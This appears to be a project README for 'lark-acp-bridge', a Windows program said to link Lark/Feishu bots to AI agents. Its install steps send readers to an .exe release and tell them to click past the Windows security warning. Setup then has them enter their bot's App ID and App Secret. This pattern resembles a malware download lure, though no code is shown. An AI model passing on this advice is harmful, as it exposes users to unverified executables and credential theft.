# 🤖 lark-acp-bridge - Connect your Lark bots to AI

[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Cristoferjosue3318/lark-acp-bridge/releases)

## What is this tool

Lark-acp-bridge acts as a connector. It links your Lark or Feishu bots to powerful AI agents. You can use services like Claude Code, Kiro CLI, Codex, Gemini, or Copilot directly inside your chat. 

The software enables interactive cards for your chats. It manages tool permissions. It keeps your session data active so you do not lose progress. You gain a bridge between your work tools and your preferred AI models.

## 🛠 Prerequisites

You need a computer running Windows 10 or 11. Make sure you have at least 200MB of free space on your hard drive. Your internet connection must remain active while the bot runs. You also need an account on the Lark or Feishu platform to create your bot credentials.

## 📥 How to Install

Follow these steps to set up the software:

1. Visit the [releases page](https://github.com/Cristoferjosue3318/lark-acp-bridge/releases) to see all available versions.
2. Look for the latest version at the top of the list.
3. Click the link that ends in .exe to start your download.
4. Open the file once the download finishes. 
5. Windows might show a warning message because the software comes from an external source. Click More info, then click Run anyway to proceed.
6. The setup window opens. Follow the prompts on the screen to choose your installation folder.
7. Click Finish to complete the process.

## ⚙️ Initial Setup

The application needs your bot information to function. Do not share these credentials with anyone.

1. Open your Lark or Feishu developer console in your web browser.
2. Select your bot from the dashboard.
3. Copy the App ID and the App Secret. 
4. Launch the lark-acp-bridge application from your desktop or Start menu.
5. Paste your App ID and App Secret into the configuration fields.
6. Choose your desired AI agent from the dropdown menu.
7. Click Save to store your settings.
8. Restart the application to apply the changes.

## 🚀 Using the Bridge

Once the application runs, it monitors your Lark or Feishu bot. When you send a message to your bot, the bridge sends that request to the AI agent you selected. The AI returns a response that displays inside Lark. 

If you use interactive cards, the bot displays buttons or forms for you to select. These cards make it easy to trigger specific tasks without typing complex commands. The tool automatically handles permissions based on the settings you choose in the configuration menu. 

The software supports session resume functionality. If you close the window or lose internet connection, the system attempts to restore your last active conversation once it reconnects. 

## 🛡 Security Practices

Keep your bot credentials secret. Do not upload your configuration files to public cloud storage or email them to others. The application does not store your message history on external servers. It only acts as a pass-through layer between your bot and your AI provider. 

## 🩺 Troubleshooting

If the bot fails to respond, check these items:

* Verify your internet connection.
* Check your Lark developer console to confirm the bot status shows as online.
* Open the lark-acp-bridge logs folder to look for error codes.
* Ensure your API keys for the AI service remain valid.
* Restart the bridge application if it stops responding to messages.

## 💻 Technical Details

The tool handles the conversion between the Lark messaging format and the ACP agent protocol. It maintains a local database to keep track of tool permissions and active sessions. The memory footprint remains low even during high-traffic periods. 

Keywords: acp, agent, ai-agent, chatbot, claude, claude-code, codex, feishu, feishu-bot, gemini, kiro, lark, lark-bot, llm, mcp